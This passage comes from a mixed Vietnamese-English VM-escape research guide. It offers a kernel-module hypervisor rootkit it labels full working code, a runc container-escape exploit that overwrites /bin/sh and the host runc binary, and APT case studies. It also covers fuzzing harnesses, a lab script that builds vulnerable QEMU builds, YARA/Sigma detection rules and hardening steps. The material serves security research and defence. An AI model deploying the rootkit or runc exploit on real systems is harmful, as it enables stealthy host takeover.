        regs->rax = (regs->rax & ~0xFF) | scancode;
    }
}
```

### 8.5 Minimal Hypervisor Rootkit — Full Working Code

```c
/*
 * mini_hv_rootkit.c — Minimal x86_64 hypervisor rootkit
 * 
 * Linux kernel module that:
 * 1. Enables VMX on current CPU
 * 2. Creates VMCS with current OS state
 * 3. Launches OS as guest
 * 4. Intercepts selected operations
 *
 * Build: make -C /lib/modules/$(uname -r)/build M=$(pwd)
 * Load: insmod mini_hv_rootkit.ko
 *
 * WARNING: This WILL crash if VMCS setup is wrong.
 * Test in nested VM only!
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <asm/vmx.h>
#include <asm/msr.h>
#include <asm/desc.h>
#include <asm/special_insns.h>

MODULE_LICENSE("GPL");

#define VMXON_SIZE  4096
#define VMCS_SIZE   4096
#define STACK_SIZE  (PAGE_SIZE * 4)

struct vmx_state {
    void *vmxon_region;
    phys_addr_t vmxon_phys;
    void *vmcs_region;
    phys_addr_t vmcs_phys;
    void *host_stack;
    bool vmx_enabled;
};

static DEFINE_PER_CPU(struct vmx_state, cpu_vmx);

static uint32_t get_vmcs_revision(void) {
    uint64_t vmx_basic;
    rdmsrl(MSR_IA32_VMX_BASIC, vmx_basic);
    return (uint32_t)(vmx_basic & 0x7FFFFFFF);
}

static int enable_vmx(void *info) {
    struct vmx_state *state = this_cpu_ptr(&cpu_vmx);
    uint64_t cr0, cr4, feat;
    uint32_t revision;
    
    /* Check VMX support */
    if (!(native_read_cr4() & X86_CR4_VMXE)) {
        cr4 = native_read_cr4();
        native_write_cr4(cr4 | X86_CR4_VMXE);
    }
    
    /* Check IA32_FEATURE_CONTROL */
    rdmsrl(MSR_IA32_FEAT_CTL, feat);
    if (!(feat & FEAT_CTL_LOCKED)) {
        feat |= FEAT_CTL_LOCKED | FEAT_CTL_VMX_ENABLED_OUTSIDE_SMX;
        wrmsrl(MSR_IA32_FEAT_CTL, feat);
    }
    
    /* Allocate VMXON region */
    state->vmxon_region = (void *)__get_free_page(GFP_KERNEL);
    if (!state->vmxon_region) return -ENOMEM;
    memset(state->vmxon_region, 0, VMXON_SIZE);
    state->vmxon_phys = virt_to_phys(state->vmxon_region);
    
    /* Write VMCS revision ID */
    revision = get_vmcs_revision();
    *(uint32_t *)state->vmxon_region = revision;
    
    /* VMXON */
    if (__vmxon(state->vmxon_phys)) {
        pr_err("VMXON failed\n");
        free_page((unsigned long)state->vmxon_region);
        return -EIO;
    }
    
    state->vmx_enabled = true;
    pr_info("VMX enabled on CPU %d\n", smp_processor_id());
    
    /* Allocate VMCS */
    state->vmcs_region = (void *)__get_free_page(GFP_KERNEL);
    if (!state->vmcs_region) return -ENOMEM;
    memset(state->vmcs_region, 0, VMCS_SIZE);
    state->vmcs_phys = virt_to_phys(state->vmcs_region);
    *(uint32_t *)state->vmcs_region = revision;
    
    /* VMCLEAR + VMPTRLD */
    if (vmcs_clear(state->vmcs_phys) || vmcs_load(state->vmcs_phys)) {
        pr_err("VMCS setup failed\n");
        return -EIO;
    }
    
    /* Allocate host stack */
    state->host_stack = kmalloc(STACK_SIZE, GFP_KERNEL);
    
    pr_info("VMCS loaded, ready to configure\n");
    return 0;
}

/*
 * Configure VMCS: capture current CPU state as guest state
 * Set host state to our hypervisor handler
 * (Simplified — full implementation needs all VMCS fields)
 */
static void setup_vmcs(struct vmx_state *state) {
    struct desc_ptr gdt, idt;
    uint16_t es, cs, ss, ds, fs, gs, tr, ldt;
    uint64_t cr0, cr3, cr4;
    
    /* Read current state */
    native_store_gdt(&gdt);
    store_idt(&idt);
    
    savesegment(es, es);
    savesegment(cs, cs);
    savesegment(ss, ss);
    savesegment(ds, ds);
    savesegment(fs, fs);
    savesegment(gs, gs);
    store_tr(tr);
    sldt(ldt);
    
    cr0 = read_cr0();
    cr3 = __read_cr3();
    cr4 = native_read_cr4();
    
    /* Guest state = current state (OS thinks nothing changed) */
    vmcs_write64(GUEST_CR0, cr0);
    vmcs_write64(GUEST_CR3, cr3);
    vmcs_write64(GUEST_CR4, cr4);
    
    vmcs_write16(GUEST_ES_SELECTOR, es);
    vmcs_write16(GUEST_CS_SELECTOR, cs);
    vmcs_write16(GUEST_SS_SELECTOR, ss);
    vmcs_write16(GUEST_DS_SELECTOR, ds);
    vmcs_write16(GUEST_FS_SELECTOR, fs);
    vmcs_write16(GUEST_GS_SELECTOR, gs);
    vmcs_write16(GUEST_TR_SELECTOR, tr);
    vmcs_write16(GUEST_LDTR_SELECTOR, ldt);
    
    vmcs_write64(GUEST_GDTR_BASE, gdt.address);
    vmcs_write32(GUEST_GDTR_LIMIT, gdt.size);
    vmcs_write64(GUEST_IDTR_BASE, idt.address);
    vmcs_write32(GUEST_IDTR_LIMIT, idt.size);
    
    /* Host state = our hypervisor */
    vmcs_write64(HOST_CR0, cr0);
    vmcs_write64(HOST_CR3, cr3);  /* Share page tables for now */
    vmcs_write64(HOST_CR4, cr4);
    
    vmcs_write16(HOST_CS_SELECTOR, cs);
    vmcs_write16(HOST_SS_SELECTOR, ss);
    vmcs_write16(HOST_DS_SELECTOR, ds);
    vmcs_write16(HOST_ES_SELECTOR, es);
    vmcs_write16(HOST_FS_SELECTOR, fs);
    vmcs_write16(HOST_GS_SELECTOR, gs);
    vmcs_write16(HOST_TR_SELECTOR, tr);
    
    vmcs_write64(HOST_GDTR_BASE, gdt.address);
    vmcs_write64(HOST_IDTR_BASE, idt.address);
    
    /* Host RIP = VM exit handler entry point */
    vmcs_write64(HOST_RIP, (uint64_t)vm_exit_handler);
    /* Host RSP = top of our stack */
    vmcs_write64(HOST_RSP, (uint64_t)state->host_stack + STACK_SIZE - 8);
    
    /* VM execution controls */
    /* Intercept: CPUID, VMCALL, CR access, RDMSR, WRMSR */
    uint32_t pinbased = /* read allowed from MSR */ 0;
    uint32_t procbased = CPU_BASED_ACTIVATE_SECONDARY_CONTROLS
                       | CPU_BASED_USE_MSR_BITMAPS
                       | CPU_BASED_CR3_LOAD_EXITING;
    
    vmcs_write32(PIN_BASED_VM_EXEC_CONTROL, pinbased);
    vmcs_write32(CPU_BASED_VM_EXEC_CONTROL, procbased);
    
    /* VM exit controls */
    vmcs_write32(VM_EXIT_CONTROLS, VM_EXIT_HOST_ADDR_SPACE_SIZE);
    vmcs_write32(VM_ENTRY_CONTROLS, VM_ENTRY_IA32E_MODE);
    
    pr_info("VMCS configured\n");
}

static int __init hv_rootkit_init(void) {
    pr_info("Hypervisor rootkit loading...\n");
    on_each_cpu(enable_vmx, NULL, 1);
    return 0;
}

static void __exit hv_rootkit_exit(void) {
    /* VMXOFF on each CPU */
    pr_info("Hypervisor rootkit unloading...\n");
}

module_init(hv_rootkit_init);
module_exit(hv_rootkit_exit);
```

---

## Phần 9: APT Case Studies

### 9.1 APT29 (Cozy Bear) — VM-aware Malware

```
APT29 (SVR - Russian Foreign Intelligence Service)

VM Escape relevance:
- APT29 malware extensively checks for VM environment
- WellMess, WellMail, GoldMax tools detect VMs to evade analysis
- Không có public evidence của VM escape exploit,
  nhưng có evidence của anti-VM và VM-aware behavior

VM Detection techniques used by APT29:
1. CPUID checks (hypervisor present bit)
2. Registry keys (VMware Tools, VBox Guest Additions)
3. MAC address prefix (VMware: 00:0C:29, VBox: 08:00:27)
4. Process names (vmtoolsd, VBoxService)
5. Timing-based detection (RDTSC delta)
6. File system artifacts (vmware.sys, VBoxGuest.sys)
```

### 9.2 Equation Group (NSA/TAO) — Firmware-Level Capabilities

```
Equation Group (attributed to NSA's Tailored Access Operations)
Discovered by: Kaspersky Lab (2015)

Relevance cho VM escape:
- Không có public evidence trực tiếp của VM escape exploit
- NHƯNG: capabilities ở firmware level chứng minh khả năng

Key capabilities:
├── Hard drive firmware reprogramming
│   → Hidden sectors không bị OS/antivirus detect
│   → Survives disk format + OS reinstall
│   → Nếu có thể reprogram HDD firmware → hypervisor firmware?
│
├── UEFI/BIOS implants
│   → Boot trước OS, trước hypervisor
│   → SubVirt-style attack nhưng ở hardware level
│
├── DanderSpritz framework
│   → Full post-exploitation platform
│   → Plugin architecture: modular capabilities
│   → Có khả năng target virtualization components
│
└── Shadow Brokers leak (2016-2017)
    → Leaked tools target Cisco, Fortinet, VMware
    → BENIGNCERTAIN: VPN exploitation
    → Tools cho network infrastructure → lateral movement to hypervisors

Lessons:
- Nation-state actors CÓ resources cho hypervisor-level attacks
- Firmware persistence vượt qua cả VM isolation
- Nếu compromise UEFI → control trước hypervisor boot
```

### 9.3 Turla (Snake/Uroburos) — Sophisticated Persistence

```
Turla (FSB - Russian Federal Security Service)
Active since ~2004, one of most sophisticated APT groups

VM/Hypervisor relevance:
├── Uroburos rootkit: kernel-level rootkit với VFS hooking
│   → Tương tự hypervisor rootkit concepts
│   → Intercept ở kernel level, không cần hypervisor
│
├── LightNeuron: Exchange server backdoor
│   → Attack infrastructure, không VM trực tiếp
│   → Nhưng pattern: target management servers
│   → Tương tự: target vCenter thay vì escape VM
│
├── VM-aware operations:
│   → Turla tools detect VM environment
│   → Adjust behavior (sleep, reduce activity)
│   → Hoặc refuse to run in VM (anti-analysis)
│
└── Satellite-based C2:
    → Hijack satellite internet links for C2
    → Demonstrate: attack any layer of infrastructure

Lesson cho VM escape research:
- APTs thường KHÔNG cần VM escape
- Thay vào đó: compromise management plane
  (vCenter, ESXi management, Hyper-V SCVMM)
- VM escape là last resort khi management plane hardened
```

### 9.4 Sandworm (GRU Unit 74455) — ESXi Targeting

```
Sandworm Team — targeting VMware ESXi infrastructure

Notable operations:
1. 2022: ESXi ransomware attacks
   - Exploit CVE-2021-21974 (OpenSLP heap overflow in ESXi)
   - Encrypt VMDK files directly on ESXi datastore
   - No VM escape needed — attack hypervisor directly

2. 2023: Continued ESXi targeting
   - CVE-2022-31696 (ESXi heap OOB write)
   - CVE-2022-31705 (ESXi USB arbitrary out-of-bounds read/write)

Lessons:
- VM escape không phải cách duy nhất
- Attack hypervisor management interface trực tiếp
- ESXi OpenSLP, vCenter web interface cũng là targets
- Supply chain: compromise vCenter → control all VMs
```

### 9.5 UNC3886 — vCenter & ESXi Advanced Backdoor

```
UNC3886 (Mandiant designation) — China-nexus group

Sophisticated VMware targeting (2022-2023):

Attack chain:
1. Exploit FortiGate 0-day → initial access
2. Move laterally to vCenter server
3. Exploit CVE-2023-34048 (vCenter out-of-bounds write)
4. Install custom backdoors on ESXi:
   - VirtualPITA: ESXi backdoor via malicious VIB (vSphere Install Bundle)
   - VirtualPIE: Python backdoor in vCenter
   - VirtualGATE: utility to test C2 connections

Key techniques:
- Abuse vpxuser (auto-generated ESXi credential in vCenter DB)
- Tamper with ESXi firewall rules
- Modify VMX files to add serial ports (for persistence)
- Install malicious VIBs with --force flag
- Live in ESXi where EDR cannot reach

Detection evasion:
- No VM escape needed — attack management plane
- ESXi has no EDR agents
- Logs often not forwarded to SIEM
- VIB signing bypass via --force flag

Indicators:
- Unauthorized VIB installations
- Modified VMX configuration files
- Unexpected serial port connections
- vpxuser credential extraction
```

### 9.6 MAESTRO Campaign (2025) — ESXi Zero-Day Chain In-the-Wild

```
China-linked actors — CVE-2025-22224/22225/22226 exploitation

Timeline:
- Discovered by Microsoft Threat Intelligence Center (MSTIC)
- Disclosed by Broadcom: March 4, 2025
- 37,000+ ESXi instances at risk globally

Zero-day chain:
1. CVE-2025-22224 (CVSS 9.3): TOCTOU race in VMCI → OOB write
   Guest admin → code exec as VMX process on host
2. CVE-2025-22225 (CVSS 8.2): Arbitrary write in VMX 
   VMX sandbox escape → ESXi kernel
3. CVE-2025-22226 (CVSS 7.1): OOB read in HGFS
   Leak sensitive memory from VMX process

Tooling:
- MAESTRO toolkit: supported 155 ESXi builds (v5.1 → v8.0)
  Indicates EXTENSIVE reverse engineering of VMware internals
- VSOCKpuppet backdoor: C2 qua Virtual Sockets (VSOCK)
  → Bypass hoàn toàn network monitoring truyền thống
  → VSOCK không đi qua network stack, không bị IDS/IPS detect

Impact:
- Full guest-to-hypervisor escape
- Access all VMs, VM data, ESXi config, mounted storage
- Complete infrastructure compromise

Source: Tenable, Huntress, PurpleOps analyses
```

### 9.7 KVM Escape Researchers (2026) — Hyunwoo Kim

```
Hyunwoo Kim — prolific KVM escape researcher

Januscape (CVE-2026-53359, July 2026):
- UAF in KVM shadow MMU emulation code
- Bug existed for 16 YEARS (since kernel 2.6.36)
- First KVM escape working on BOTH Intel AND AMD
- Submitted to Google kvmCTF ($250K bounty for full escape)
- Massive impact: AWS, GCP, Azure — tất cả dùng KVM

Zapscape (CVE-2026-64561, August 2026):
- Expired pointer dereference in KVM/x86 shadow MMU
- Exploitable khi nested virtualization enabled
- Affected Linux 5.9+

ITScape (CVE-2026-46316, June 2026):
- First KVM/arm64 guest-to-host escape ever
- Race condition trong virtual interrupt controller
- Mở rộng attack surface sang ARM servers

Lesson: Shadow MMU là attack surface rất giàu bugs
→ Focus research vào memory management code
```

---

## Phần 10: Fuzzing Hypervisor

### 10.1 AFL/LibFuzzer cho QEMU Devices

```c
/*
 * qemu_device_fuzzer.c — Fuzz QEMU device emulation with AFL
 *
 * Approach 1: Build QEMU with fuzzer support
 * QEMU 5.0+ has built-in libfuzzer support: --enable-fuzzing
 *
 * Approach 2: AFL fork-server mode
 * Compile QEMU with AFL instrumentation
 *
 * Approach 3: Snapshot-based fuzzing
 * Take VM snapshot → restore → send fuzzed input → check crash
 */

/* Method 1: QEMU's built-in fuzz targets */
/*
 * Build:
 *   cd qemu
 *   mkdir build-fuzz && cd build-fuzz
 *   ../configure --enable-fuzzing --target-list=x86_64-softmmu
 *   make qemu-fuzz-x86_64
 *
 * Run:
 *   ./qemu-fuzz-x86_64 --fuzz-target=virtio-net-socket-fuzz
 *
 * Available fuzz targets (qemu/tests/qtest/fuzz/):
 *   - virtio-net-socket-fuzz
 *   - virtio-blk-fuzz
 *   - virtio-scsi-fuzz
 *   - e1000-fuzz
 *   - e1000e-fuzz
 *   - rtl8139-fuzz
 *   - i440fx-fuzz
 *   - q35-fuzz
 *   - etc.
 */

/* Method 2: Custom fuzzer cho specific device */
/*
 * Viết QTest harness cho device cụ thể:
 * QTest = QEMU testing framework, giao tiếp qua Unix socket
 * Gửi I/O commands từ bên ngoài QEMU process
 */

/* Ví dụ: Fuzz RTL8139 registers */
#include <stdint.h>
#include <stddef.h>

/* Called by libfuzzer */
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size < 4) return 0;
    
    /* Parse fuzz input as register writes */
    size_t offset = 0;
    while (offset + 4 <= size) {
        uint8_t reg = data[offset] % 0x100;   /* Register offset */
        uint8_t width = (data[offset + 1] % 3) + 1; /* 1, 2, or 4 bytes */
        uint32_t value;
        
        if (width == 1) {
            value = data[offset + 2];
        } else if (width == 2) {
            value = *(uint16_t *)(data + offset + 2);
        } else {
            if (offset + 6 > size) break;
            value = *(uint32_t *)(data + offset + 2);
        }
        
        /* Write to RTL8139 MMIO */
        /* qtest_writel(rtl8139_mmio_base + reg, value); */
        
        offset += 2 + width;
    }
    
    return 0;
}

/* Method 3: Guest-side fuzzer */
/*
 * Chạy fuzzer bên trong guest VM:
 * + Dễ setup, natural interaction với device
 * + Coverage từ QEMU ASAN build
 * - Chậm (mỗi iteration cần VM I/O round-trip)
 * - Khó reset state
 *
 * Cải thiện: kafl (kAFL) — hardware-assisted fuzzing
 * - Dùng Intel PT (Processor Trace) cho coverage
 * - Snapshot/restore nhanh qua KVM
 * - Fuzz kernel code, hypervisor code, firmware
 */
```

### 10.2 hAFL2 — Hyper-V Fuzzing Framework

```
hAFL2 (SafeBreach Labs):
https://github.com/SB-GC-Labs/hAFL2

Architecture:
1. Modified QEMU boots Windows guest
2. Windows loads Hyper-V components (hvix64.exe, hvax64.exe)
3. AFL++ provides coverage guidance via breakpoints
4. Fuzzer generates hypercall inputs
5. Coverage feedback from Hyper-V binary

Setup:
1. Build modified QEMU with hAFL2 patches
2. Prepare Windows image with Hyper-V role
3. Configure AFL++ with QEMU backend
4. Create corpus of valid hypercall inputs
5. Run fuzzer

Results:
- Found multiple DoS bugs in Hyper-V
- Demonstrated feasibility of black-box hypervisor fuzzing
```

### 10.3 Nyx — Coverage-guided Hypervisor Fuzzing

```
Nyx Fuzzer (Schumilo et al., USENIX Security 2021):
https://github.com/nyx-fuzz

Key innovations:
1. Fast snapshot restore via KVM dirty page tracking
2. Intel PT for hardware-assisted coverage
3. Structured input generation (grammar-based)
4. Support for QEMU, bhyve, and custom targets

Architecture:
┌──────────────────────────────────────────┐
│  AFL++ / LibAFL                          │
│  (Mutator + Coverage analysis)           │
└──────────────┬───────────────────────────┘
               │ Fuzz input
┌──────────────▼───────────────────────────┐
│  Nyx Agent (in guest VM)                 │
│  - Receives fuzz input                   │
│  - Sends to target (device I/O)          │
│  - Reports coverage via shared memory    │
└──────────────┬───────────────────────────┘
               │ I/O / Hypercall
┌──────────────▼───────────────────────────┐
│  Target Hypervisor / Device              │
│  (QEMU, bhyve, custom VMM)              │
│  - Intel PT trace collection             │
│  - Crash detection (ASAN, signals)       │
└──────────────────────────────────────────┘

Setup cho QEMU device fuzzing:
  cd nyx
  python3 nyx_config.py \
    --target qemu \
    --device rtl8139 \
    --corpus ./corpus/ \
    --output ./findings/

Nyx đã tìm được hàng chục bugs trong QEMU devices.
```

---

### 10.4 Custom Harness cho VMware

```
VMware là closed-source → fuzzing phức tạp hơn:

Approach 1: Binary fuzzing (black-box)
├── Attach AFL/WinAFL tới vmware-vmx process
├── Hook I/O handler functions (found via reverse engineering)
├── Mutate input tại function entry point
├── Monitor cho crashes
└── Tools: WinAFL, DynamoRIO, Intel Pin

Approach 2: RPCI protocol fuzzing
├── Dùng ZDI's Python RPCI tools
├── Generate/mutate RPCI messages từ guest
├── Send qua VMware Backdoor interface
├── Monitor vmware-vmx cho crashes
└── Không cần RE — protocol là text-based

Approach 3: SVGA command fuzzing
├── Fuzz SVGA FIFO commands
├── Mutate command parameters (dimensions, offsets)
├── Focus on 3D commands (complex parsing)
└── Monitor cho ASAN/crash signals

Approach 4: Snapshot-based
├── Take VM snapshot trước mỗi test case
├── Send fuzzed input
├── Check crash → restore snapshot → repeat
└── Slow nhưng reliable

Practical tips:
- Compile vmware-vmx-debug (nếu có access)
- Attach WinDbg/GDB tới vmware-vmx process
- Set breakpoints trên key handler functions
- Ida Pro / Ghidra RE của vmware-vmx binary
- Map attack surface: tìm tất cả switch cases trong RPCI handler
```

---

## Phần 11: Container Escape (Bonus)

### 11.1 Docker vs VM Escape

```
Docker/Container:                    VM:
┌────────┬────────┐                ┌────────┬────────┐
│ App A  │ App B  │                │ App A  │ App B  │
├────────┼────────┤                ├────────┴────────┤
│ Libs A │ Libs B │                │  Guest OS       │
├────────┴────────┤                ├─────────────────┤
│ Container Runtm │                │  Hypervisor     │
├─────────────────┤                ├─────────────────┤
│  Host Kernel    │                │  Host OS/HW     │
├─────────────────┤                └─────────────────┘
│  Hardware       │
└─────────────────┘

Container escape dễ hơn VM escape vì:
- Shared kernel (1 bug trong kernel = escape)
- Namespace/cgroup = software isolation (vs hardware isolation)
- Nhiều syscall surface hơn

VM escape khó hơn vì:
- Hardware isolation (VT-x, EPT)
- Nhỏ hơn attack surface (device emulation only)
- Hypervisor code nhỏ hơn kernel
```

### 11.2 CVE-2019-5736 — runc Container Escape

```c
/*
 * cve_2019_5736.c — runc container escape
 * 
 * Bug: Overwrite host runc binary from container
 * 
 * Attack:
 * 1. Container creates malicious binary
 * 2. When host does "docker exec" into container,
 *    host opens /proc/self/exe (runc binary)
 * 3. Container races to overwrite /proc/self/exe
 *    through /proc/<pid>/exe symlink
 * 4. Next "docker run" executes modified runc → host code execution
 *
 * Không phải VM escape, nhưng concept tương tự:
 * escape isolation boundary qua shared resource
 */

/*
 * Simplified exploit concept:
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void attempt_runc_overwrite(void) {
    /* 
     * Inside container:
     * 1. Replace /bin/sh with script that exploits the race
     */
    
    /* Payload: script that overwrites runc when exec'd */
    const char *payload = 
        "#!/bin/bash\n"
        "# Wait for runc to open us\n"
        "while ! cat /proc/*/cmdline 2>/dev/null | grep -q runc; do\n"
        "  sleep 0.01\n"
        "done\n"
        "# Find runc's PID\n"
        "RUNC_PID=$(ps aux | grep 'runc' | grep -v grep | awk '{print $2}')\n"
        "# Overwrite runc binary via /proc/PID/exe\n"
        "echo '#!/bin/bash' > /proc/$RUNC_PID/exe\n"
        "echo 'id > /tmp/pwned' >> /proc/$RUNC_PID/exe\n";
    
    /* Write exploit as the container's entrypoint */
    int fd = open("/bin/sh", O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        write(fd, payload, strlen(payload));
        close(fd);
    }
}
```

---

### 11.3 Kata Containers — VM-backed Containers

```
Kata Containers: chạy mỗi container trong lightweight VM

Architecture:
┌──────────┐ ┌──────────┐
│Container │ │Container │
│  (app)   │ │  (app)   │
├──────────┤ ├──────────┤
│Guest kern│ │Guest kern│   ← Mỗi container có kernel riêng
├──────────┤ ├──────────┤
│  QEMU /  │ │  QEMU /  │   ← Mỗi container có VMM riêng
│ Firecrk  │ │ Firecrk  │
├──────────┴─┴──────────┤
│       Host Kernel      │
└────────────────────────┘

Security model:
- Container isolation = VM isolation (hardware VT-x/EPT)
- Container escape = VM escape (cần exploit hypervisor)
- Dùng lightweight VMMs: QEMU (stripped), Firecracker, Cloud-Hypervisor

Firecracker (Amazon):
- Minimal VMM viết bằng Rust
- ~50K lines (vs QEMU ~2M lines)
- Ít device emulation → ít attack surface
- Dùng cho AWS Lambda, Fargate
- virtio-only devices (no legacy emulation)

Cloud-Hypervisor (Intel/Microsoft):
- Rust-based, similar goals to Firecracker
- Focus: cloud-native workloads
- Minimal device surface

Implication cho security:
- Giảm attack surface 10-100x so với full QEMU
- Nhưng: virtio devices vẫn là target
- Rust memory safety giảm buffer overflow bugs
- Trade-off: performance vs compatibility vs security
```

---

## Phần 12: Lab Setup

### Xây dựng môi trường thực hành an toàn

```bash
#!/bin/bash
# vm_escape_lab_setup.sh — Thiết lập lab cho VM escape research

echo "=== VM Escape Research Lab Setup ==="

# === 1. QEMU/KVM Lab (Linux host) ===

# Cài đặt QEMU từ source (với debug symbols)
sudo apt-get install -y git build-essential ninja-build \
    libglib2.0-dev libpixman-1-dev libfdt-dev \
    libcap-ng-dev libattr1-dev libseccomp-dev \
    pkg-config python3 python3-pip

# Clone QEMU
git clone https://gitlab.com/qemu-project/qemu.git
cd qemu
git checkout v8.1.0  # Hoặc version muốn research

# Build QEMU VỚI debug symbols + ASAN (Address Sanitizer)
mkdir build-debug && cd build-debug
../configure \
    --target-list=x86_64-softmmu \
    --enable-debug \
    --enable-debug-info \
    --enable-sanitizers \
    --enable-trace-backends=log \
    --disable-strip \
    --extra-cflags="-g3 -O0 -fsanitize=address,undefined"
make -j$(nproc)

# Build QEMU VỚI fuzzing support
mkdir ../build-fuzz && cd ../build-fuzz
../configure \
    --target-list=x86_64-softmmu \
    --enable-fuzzing
make qemu-fuzz-x86_64

cd ../..

# === 2. Tạo vulnerable QEMU test VM ===
# Dùng old QEMU version có known CVEs

# QEMU 2.3.0 (có VENOM — CVE-2015-3456)
git clone https://gitlab.com/qemu-project/qemu.git qemu-2.3
cd qemu-2.3
git checkout v2.3.0
mkdir build && cd build
../configure --target-list=x86_64-softmmu --enable-debug
make -j$(nproc)
cd ../..

# === 3. Tạo guest image ===
# Download Ubuntu minimal
wget https://cloud-images.ubuntu.com/minimal/releases/jammy/release/ubuntu-22.04-minimal-cloudimg-amd64.img

# Resize image
qemu-img resize ubuntu-22.04-minimal-cloudimg-amd64.img 20G

# Create cloud-init config
cat > user-data.yaml << 'EOF'
#cloud-config
password: research
chpasswd: {expire: False}
ssh_pwauth: True
packages:
  - build-essential
  - gdb
  - python3
  - linux-headers-$(uname -r)
  - pciutils
  - tcpdump
EOF

# === 4. Launch script cho các scenarios ===

# Scenario 1: QEMU với FDC (VENOM target)
cat > run_fdc.sh << 'SCRIPT'
#!/bin/bash
./qemu-2.3/build/x86_64-softmmu/qemu-system-x86_64 \
    -m 1024 \
    -hda ubuntu-22.04-minimal-cloudimg-amd64.img \
    -device floppy,drive=floppy0 \
    -drive id=floppy0,if=none,format=raw,file=/dev/null \
    -enable-kvm \
    -nographic \
    -monitor stdio
SCRIPT

# Scenario 2: QEMU với RTL8139 (info leak target)  
cat > run_rtl8139.sh << 'SCRIPT'
#!/bin/bash
./qemu/build-debug/qemu-system-x86_64 \
    -m 2048 \
    -hda ubuntu-22.04-minimal-cloudimg-amd64.img \
    -device rtl8139,netdev=net0 \
    -netdev user,id=net0 \
    -enable-kvm \
    -nographic \
    -monitor stdio
SCRIPT

# Scenario 3: QEMU với USB EHCI (OOB target)
cat > run_usb.sh << 'SCRIPT'
#!/bin/bash
./qemu/build-debug/qemu-system-x86_64 \
    -m 2048 \
    -hda ubuntu-22.04-minimal-cloudimg-amd64.img \
    -device ich9-usb-ehci1 \
    -device usb-tablet \
    -enable-kvm \
    -nographic \
    -monitor stdio
SCRIPT

# === 5. GDB debug setup ===
cat > qemu-gdb.py << 'PYTHON'
# GDB script for QEMU debugging
import gdb

class QEMUDeviceBreak(gdb.Command):
    """Set breakpoint on QEMU device handler."""
    
    def __init__(self):
        super().__init__("qemu-bp", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        device_handlers = {
            'rtl8139': ['rtl8139_ioport_write', 'rtl8139_mmio_write',
                        'rtl8139_receive'],
            'fdc': ['fdctrl_write', 'fdctrl_read', 'fdctrl_write_data'],
            'e1000': ['e1000_mmio_write', 'e1000_receive_iov'],
            'pcnet': ['pcnet_ioport_write', 'pcnet_receive'],
            'ehci': ['ehci_mem_write', 'ehci_execute'],
        }
        
        if arg in device_handlers:
            for func in device_handlers[arg]:
                gdb.execute(f'break {func}')
                print(f'Breakpoint set on {func}')
        else:
            print(f'Unknown device: {arg}')
            print(f'Available: {", ".join(device_handlers.keys())}')

QEMUDeviceBreak()
PYTHON

echo "=== Lab setup complete ==="
echo "Run scenarios:"
echo "  bash run_fdc.sh      # VENOM target"
echo "  bash run_rtl8139.sh  # RTL8139 leak target"  
echo "  bash run_usb.sh      # USB EHCI target"
echo ""
echo "Debug QEMU:"
echo "  gdb -x qemu-gdb.py --args ./qemu/build-debug/..."
echo "  (gdb) qemu-bp rtl8139"
```

---

## Phần 13: Defense & Detection

### Detecting VM Escape Attempts

```yaml
# === YARA Rules cho VM Escape Indicators ===

rule VMEscape_QEMU_IO_Access:
    meta:
        description = "Detect direct I/O port access to emulated devices"
        severity = "high"
    strings:
        $iopl = { E4 ?? }  # IN AL, imm8
        $outb = { E6 ?? }  # OUT imm8, AL
        $inl  = { ED }     # IN EAX, DX
        $outl = { EF }     # OUT DX, EAX
        
        # FDC ports (VENOM)
        $fdc_port = { B2 F5 03 }  # MOV DX, 0x3F5
        
        # VMware backdoor
        $vmware_magic = { 68 58 4D 56 }  # push 0x564D5868
        $vmware_port  = { BA 58 56 }      # MOV DX, 0x5658
        
    condition:
        any of ($iopl, $outb, $inl, $outl) and 
        any of ($fdc_port, $vmware_magic, $vmware_port)

rule VMEscape_Hypercall:
    meta:
        description = "Detect hypercall instructions"
    strings:
        $vmcall  = { 0F 01 C1 }  # VMCALL (Intel)
        $vmmcall = { 0F 01 D9 }  # VMMCALL (AMD)
    condition:
        any of them

# === Sigma Rules (SIEM) ===
# Detect processes accessing emulated device I/O

title: VM Escape Attempt - Direct Hardware Access from Guest
status: experimental
logsource:
    product: linux
    service: audit
detection:
    selection:
        type: SYSCALL
        syscall: 
            - iopl
            - ioperm
        success: yes
    condition: selection
level: high

# === Host-side monitoring ===
# Monitor QEMU process for crashes (ASAN output)

title: QEMU ASAN Crash Detection
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - 'AddressSanitizer'
        - 'heap-buffer-overflow'
        - 'use-after-free'
        - 'stack-buffer-overflow'
    filter:
        process_name: 'qemu*'
    condition: selection and filter
level: critical
```

### Hardening Hypervisor

```bash
#!/bin/bash
# hypervisor_hardening.sh

# === QEMU Hardening ===

# 1. Seccomp sandbox (giới hạn syscalls QEMU có thể gọi)
qemu-system-x86_64 \
    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny

# 2. Chạy QEMU dưới unprivileged user
useradd -r -s /bin/false qemu-vm
chown qemu-vm:qemu-vm /path/to/vm-image.qcow2

# 3. SELinux/AppArmor profile cho QEMU
# AppArmor profile (/etc/apparmor.d/usr.bin.qemu-system-x86_64):
# profile qemu-system-x86_64 {
#   capability net_admin,
#   capability setuid,
#   /path/to/vm-images/** rw,
#   deny /etc/shadow r,
#   deny /root/** rw,
# }

# 4. Disable unnecessary devices
qemu-system-x86_64 \
    -nodefaults \
    -device virtio-net-pci,netdev=net0 \
    -netdev user,id=net0 \
    -device virtio-blk-pci,drive=hd0 \
    -drive file=disk.qcow2,id=hd0,if=none \
    -vga none \
    -display none
# Chỉ enable devices thực sự cần, disable VGA/FDC/IDE

# 5. Memory limits (prevent QEMU heap spray)
ulimit -v 4194304  # 4GB virtual memory limit

# === VMware ESXi Hardening ===
# Disable unnecessary services
# esxcli system settings advanced set -o /UserVars/VMXVMCIPassthrough -i 0
# Disable DnD, Copy/Paste in VMX config:
# isolation.tools.copy.disable = "TRUE"
# isolation.tools.paste.disable = "TRUE"
# isolation.tools.dnd.disable = "TRUE"

# === Hyper-V Hardening ===
# Enable Credential Guard
# Enable Device Guard
# Disable RemoteFX vGPU (deprecated, removed in Windows Server 2025)
# Use Shielded VMs with vTPM
```

---

## Phần 14: Tài nguyên

### Blogs & Research Sites

| Resource | URL | Focus |
|----------|-----|-------|
